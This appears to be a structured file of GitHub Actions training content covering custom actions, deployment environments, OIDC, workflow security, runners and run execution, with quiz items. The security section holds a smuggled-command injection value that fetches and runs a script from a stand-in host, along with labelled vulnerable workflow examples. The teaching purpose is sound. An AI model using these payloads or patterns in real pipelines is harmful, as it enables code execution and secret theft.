quiz.q: Where do you put uses: org/repo/.github/workflows/ci.yml@v1?
options: Directly on a job, instead of runs-on and steps
quiz.explain: Reusable workflows are called by a job; they bring their own jobs and runners.

concepts.name: Writing custom actions
concepts.summary: Turn your own steps into an action: a composite, JavaScript or Docker container action described by an action.yml file.
concepts.why: When the same setup or logic repeats in many workflows, an action gives it a name, inputs and a version.
concepts.body:
An action is a folder (or a whole repository) with an `action.yml` file describing its `name`, `inputs`, `outputs` and how it `runs`. There are three kinds:

- **Composite**: `runs.using: composite` and a list of steps, written exactly like a job's steps. Each `run` step must say which `shell` to use. The simplest kind; good for bundling setup commands.
- **JavaScript**: `runs.using: node24` and a `main` file, a JavaScript program that the runner's built-in Node.js executes. It starts fast and works on Linux, Windows and macOS. GitHub's `@actions/core` toolkit reads inputs, sets outputs and writes logs.
- **Docker container**: `runs.using: docker` with a Dockerfile or a ready-made image. Any language works, but only on Linux runners, and it starts more slowly.

A JavaScript action gets nothing installed when someone uses it, so its code and the libraries it uses must already be in the repository. Usually you commit one combined file in `dist/`, made by a **bundler**, a tool that merges your code and those libraries into a single file.

Inputs reach composite steps as `${{ inputs.name }}`, and JavaScript and Docker actions as `INPUT_<NAME>` environment variables. Outputs work like step outputs: write to `$GITHUB_OUTPUT` and map them in `action.yml`.

Keep actions used by one repository in `.github/actions/<name>/` and call them as `./.github/actions/<name>` after checkout. Publish shared actions in their own repository with **semantic versioning** tags such as `v1.2.0` (major.minor.patch, where only a new first number signals changes that can break users), plus a short `v1` tag you move to each new compatible release so users get fixes automatically.
concepts.code:
# .github/actions/setup-app/action.yml
name: Setup app
description: Install toolchain and dependencies
inputs:
  node-version:
    description: Node.js version
    default: "22"
outputs:
  cache-hit:
    description: Whether dependencies came from cache
    value: ${{ steps.setup.outputs.cache-hit }}
runs:
  using: composite
  steps:
    - id: setup
      uses: actions/setup-node@v7
      with: {node-version: "${{ inputs.node-version }}", cache: npm}
    - run: npm ci
      shell: bash
# usage in a workflow, after actions/checkout:
#   - uses: ./.github/actions/setup-app
#     with: {node-version: "24"}
takeaways: action.yml defines inputs, outputs and how the action runs
Composite actions bundle steps; each run step needs shell:
JavaScript actions are fast and run on every system; Docker actions are Linux-only
pitfalls: Forgetting to commit the bundled dist/ of a JavaScript action; nothing is installed when it is used.

quiz.q: Which action type cannot run on a macOS runner?
quiz.explain: Docker container actions require a Linux runner with Docker.

concepts.name: Environments, approvals and concurrency
concepts.summary: Gate deployments with environments and required reviewers, and stop runs overlapping with concurrency groups.
concepts.why: Safe automatic deployment needs approvals, per-environment secrets and a guarantee that two deploys never run at once.
concepts.body:
A **deployment environment** (Settings, Environments) stands for a place you deploy to, such as `staging` (a test copy) or `production` (the live system users rely on). A job opts in with `environment: production`, and the environment can enforce **protection rules** before the job starts:

- **Required reviewers**: the job waits until a listed person or team approves.
- **Wait timer**: delay the job by up to 30 days.
- **Deployment branches and tags**: only allow, say, `main` and release tags like `v*` to deploy.

Environments also hold their own **secrets and variables**, which only jobs using that environment can read. Combined with branch rules, this means a workflow on a feature branch cannot read the live system's credentials. Deployments appear on the repository page with links to `environment.url`.

**Concurrency** settings stop runs from overlapping. All runs or jobs with the same `concurrency.group` name form a **concurrency group**: a waiting line where at most one runs and at most one waits, and a newer waiting run replaces the older waiting one. `cancel-in-progress: true` cancels the running one instead, ideal for pull request builds where only the latest commit matters. For deployments use `cancel-in-progress: false` so a half-finished deploy is never stopped.

Typical groups: `${{ github.workflow }}-${{ github.ref }}` for CI (one per workflow and branch), and a fixed `deploy-production` for deploys.
concepts.code:
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://shop.example.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false      # never kill a running deploy
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # environment secret
takeaways: environment: gates a job with reviewers, timers and branch rules
Environment secrets are only visible to jobs in that environment
A concurrency group runs one at a time; cancel-in-progress stops the running one
pitfalls: Using cancel-in-progress: true on deploy jobs, leaving systems half updated.

quiz.q: Three pushes arrive quickly for a group without cancel-in-progress. What happens?
options: Run 1 continues, run 2 is replaced by run 3 in the queue, run 3 runs after 1
All three run one after another
quiz.explain: A concurrency group holds one running and one pending entry; a newer pending run cancels the older pending one.

concepts.name: Keyless cloud deploys with OIDC
concepts.summary: Let workflows sign in to your cloud account with short-lived OpenID Connect tokens instead of stored access keys.
concepts.why: Long-lived cloud keys in secrets are the most common credential leak; OIDC removes them entirely.
concepts.body:
Deploying to a **cloud provider**, a company such as AWS, Azure or Google Cloud that rents out servers and services, needs credentials. The classic way is a long-lived access key stored as a secret, which works until it leaks.

With **OpenID Connect** (OIDC), a standard for one system to vouch for who someone is, the job instead asks GitHub for a signed **JSON Web Token**: a short piece of data saying which repository, branch or tag (`ref`), environment and workflow it comes from, signed so it can't be faked. Your cloud account is set up to trust GitHub as the signer (`https://token.actions.githubusercontent.com`) and swaps a valid token for short-lived cloud credentials. No keys are stored in GitHub at all.

To use it:

- Grant the job `permissions: id-token: write` (plus `contents: read` for checkout).
- In the cloud, set up the trust: in AWS an **IAM** OIDC provider and a role (IAM is AWS's system for who may do what; a role is a set of permissions that can be borrowed), in Azure a federated credential, in Google Cloud a workload identity pool.
- Use the provider's login action, such as `aws-actions/configure-aws-credentials` with `role-to-assume`.

The security lives in the **trust policy**: the conditions the cloud checks on the token's **claims**, the facts written inside it. The key claim is `sub`, for example `repo:my-org/shop:environment:production` or `repo:my-org/shop:ref:refs/heads/main`. Always restrict `sub` to your repository and a specific branch or environment; a policy that only checks the audience (`aud`, who the token is meant for) would let any GitHub repository use your role.

The credentials typically last an hour and die with the job, so a leaked log or a compromised dependency gets far less than a permanent key would give.
concepts.code:
permissions:
  id-token: write     # allow requesting the OIDC token
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: eu-central-1
      - run: aws sts get-caller-identity   # assumed-role/gha-deploy/...
# AWS trust policy condition (excerpt):
# "token.actions.githubusercontent.com:sub": "repo:my-org/shop:environment:production"
takeaways: OIDC exchanges a signed per-job token for short-lived cloud credentials
Requires permissions: id-token: write
Lock the trust policy to repo and branch or environment via the sub claim
pitfalls: A trust policy that checks only aud, not sub, trusts every repository on GitHub.

quiz.q: What prevents another GitHub repository from assuming your OIDC-trusted AWS role?
options: Masking of the token in logs
A trust policy condition on the token's sub claim
quiz.explain: The sub claim identifies the repository and ref or environment; the cloud trust policy must check it.

concepts.name: Workflow security: injection and untrusted code
concepts.summary: Avoid script injection, the pull_request_target trap, unpinned actions and tokens that can do too much.
concepts.why: CI holds deploy credentials and write access, so a hole in a workflow is a hole in everything it ships.
concepts.body:
Most real Actions break-ins come from a few patterns.

**Script injection.** An **injection attack** is one where text from an outsider ends up being run as commands. In workflows it is easy: `${{ }}` is pasted into the command text before bash runs. `run: echo "${{ github.event.issue.title }}"` with an issue title like `"; curl evil.sh | sh; "` runs the attacker's commands. Anything a user controls (titles, descriptions, branch names, commit messages) must go through `env:` and be used as a quoted shell variable.

**pull_request_target and workflow_run.** These run with the base repository's settings, **with secrets and a write token**, even for pull requests from forks. That is fine for adding labels, but if the workflow checks out and builds the pull request's code, the attacker's code runs with your secrets. Since `actions/checkout` v7, checking out fork code in these triggers is refused unless you set `allow-unsafe-pr-checkout: true`; don't. Never build untrusted code there: split the work into an unprivileged `pull_request` build and a privileged follow-up that only reads its artifacts as data.

**Supply chain.** Tags of third-party actions can be moved to malicious code, as happened in the 2025 tj-actions/changed-files attack. Pin third-party actions to full commit IDs and let Dependabot, GitHub's bot that opens pull requests to update versions, keep them current.

**Least privilege**: give everything only the access it needs. Set `permissions: contents: read` at the top, raise it per job, prefer short-lived OIDC cloud sign-ins over stored keys, protect environments, and require approval for workflows from first-time contributors. Checkers such as `actionlint` and `zizmor` read workflow files and flag many of these problems.
concepts.code:
# VULNERABLE: title is pasted into the script before bash runs
- run: echo "New issue ${{ github.event.issue.title }}"

# SAFE: pass untrusted data as an environment variable
- run: echo "New issue $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}

# DANGEROUS combination: privileged trigger + untrusted checkout
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker's code
          allow-unsafe-pr-checkout: true   # checkout v7 refuses without it
      - run: npm ci && npm test    # runs it with secrets available
takeaways: Never interpolate user-controlled ${{ }} values into run scripts; use env
pull_request_target + checking out PR code = secrets exposed to forks
Pin third-party actions to SHAs and default to read-only permissions
pitfalls: Believing quotes around ${{ }} inside run make it safe; the attacker can close the quotes.

quiz.q: Why is run: echo "${{ github.head_ref }}" risky in a PR workflow?
options: A branch name chosen by the PR author is pasted into the script and can contain shell syntax
quiz.explain: Expressions are substituted before the shell parses the script, so attacker-controlled text becomes code.

concepts.name: Self-hosted and larger runners
concepts.summary: Run jobs on bigger GitHub machines or on your own, choose them with labels and groups, and keep self-hosted ones safe.
concepts.why: Special hardware, private networks or very high volume make GitHub-hosted runners too limited or too expensive.
concepts.body:
GitHub-hosted runners are fresh virtual machines, one per job. There are two alternatives.

**Larger runners** are GitHub-hosted machines with more **CPU** power (the processor that does the work) and more memory, optionally **GPUs** (graphics chips, also good at heavy number-crunching) or a fixed **IP address**, so other systems can let them in by address. They are set up per organization and chosen by label.

**Self-hosted runners** run GitHub's free, **open-source** runner program on your own machine or VM. The program opens an outgoing HTTPS connection and waits for GitHub to hand it a job, so you don't need to let any traffic in from the internet.

Jobs choose runners with `runs-on`, which can be a list of labels such as `[self-hosted, linux, x64, gpu]` (all must match), or `group:` plus `labels:` for runner groups. Runner groups control which repositories may use which runners.

The big caveat: a self-hosted runner is **not reset** between jobs unless you make it so. Files, running programs, Docker images and credentials can survive from one job to the next. That is why GitHub warns against self-hosted runners on public repositories, where any fork's pull request could run code on your machine. Prefer **ephemeral runners** (`--ephemeral`): each takes a single job and is then destroyed.

At scale, **Actions Runner Controller** (ARC) runs ephemeral runners on **Kubernetes**, a system that runs containers across a group of machines, starting runners as jobs arrive and removing them when idle. Keep runners updated, give them the fewest permissions to your other systems, and keep runners for trusted and untrusted code apart.
concepts.code:
# Register an ephemeral runner (token from Settings > Actions > Runners)
./config.sh --url https://github.com/my-org --token "$REG_TOKEN" \
  --labels gpu,linux-x64 --runnergroup ml --ephemeral --unattended
./run.sh        # takes exactly one job, then exits

# Workflow side (YAML):
#   runs-on: [self-hosted, gpu]
#   or
#   runs-on:
#     group: ml
#     labels: [gpu]

# Kubernetes: Actions Runner Controller scale set via Helm
helm install arc-runners \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \
  --namespace arc-runners --set githubConfigUrl=https://github.com/my-org
takeaways: Self-hosted runners connect out to GitHub over HTTPS and wait for jobs
runs-on labels must all match; runner groups limit which repositories may use them
Use ephemeral runners or ARC so nothing carries over between jobs
pitfalls: Attaching a long-lived self-hosted runner to a public repository, letting fork pull requests run code on it.

options: Each job starts on a clean machine, so nothing leaks between jobs
They allow more than 256 matrix jobs
quiz.explain: A persistent runner keeps files, processes and credentials from earlier jobs.

concepts.name: How runs are created and executed
concepts.summary: Which version of the workflow file runs for each event, how jobs are queued and expanded, and the limits that shape large workflows.
concepts.why: Understanding the execution model explains puzzling behaviour like edits not taking effect or runs that never start.
concepts.body:
When an event arrives, GitHub reads `.github/workflows/` **at a specific commit**, which depends on the event: the pushed commit for `push`, the pull request's merge commit for `pull_request`, and the default branch for `schedule`, `workflow_dispatch` (by default) and `pull_request_target`. That is why a fix to a scheduled workflow only matters once merged into the default branch, and why `pull_request_target` uses the base branch's trusted copy.

Each matching workflow becomes a **run** with a `run_id`, a `run_number` and an attempt count for re-runs. GitHub then walks the job graph: jobs whose `needs` are met and whose job-level `if` is true are queued. Matrices are expanded into individual jobs only at that moment, which is why a matrix can depend on an earlier job's output.

A queued job waits for a runner matching its `runs-on` labels. Hosted runners are limited by how many jobs your plan lets run at once; self-hosted ones by how many are online. A job with no matching runner waits up to 24 hours before failing.

On the runner, the **runner program** downloads all referenced actions first (so a broken `uses:` fails before any step runs), then executes the steps, sending logs back live. Limits to remember: a job runs at most 6 hours on hosted runners, a workflow run at most 35 days, and re-running failed jobs reuses the same commit and workflow definition.
concepts.code:
# Inspect runs and attempts with the GitHub CLI
gh run list --workflow ci.yml --limit 3
# STATUS  TITLE        WORKFLOW  BRANCH  EVENT         ID
# ✓       Fix parser   CI        main    push          123456789
gh run view 123456789 --log-failed     # only the failing steps' logs
gh run rerun 123456789 --failed        # new attempt, same commit and YAML
gh workflow run deploy.yml -f environment=staging   # workflow_dispatch
gh run watch                            # follow a run live
takeaways: The workflow file is read at the event's commit (default branch for schedule)
Matrices expand when a job becomes ready, so they can use earlier outputs
Re-runs reuse the original commit and workflow definition
pitfalls: Editing a workflow and re-running an old run, expecting the edit to apply.

quiz.q: You fix a bug in a workflow on a feature branch, then re-run last night's failed scheduled run. Does it use the fix?
options: Yes, re-runs read the latest file
Yes, if the branch is protected
No, scheduled runs use the default branch and re-runs reuse the original definition
quiz.explain: A re-run reproduces the original commit and workflow; schedules always use the default branch.
